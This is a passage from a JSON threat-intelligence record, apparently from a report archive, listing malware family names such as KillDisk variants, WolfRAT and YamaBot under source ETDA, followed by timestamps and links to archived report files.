                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536078,
    "ts_updated_at": 1743041843,
    "ts_creation_date": 1664713544,
    "ts_modification_date": 1664713544,
    "files": {
        "pdf": "https://archive.orkl.eu/b41a76a549eb9ae91c614d1923ece06836cb2d49.pdf",
        "text": "https://archive.orkl.eu/b41a76a549eb9ae91c614d1923ece06836cb2d49.txt",
        "img": "https://archive.orkl.eu/b41a76a549eb9ae91c614d1923ece06836cb2d49.jpg"
    }
}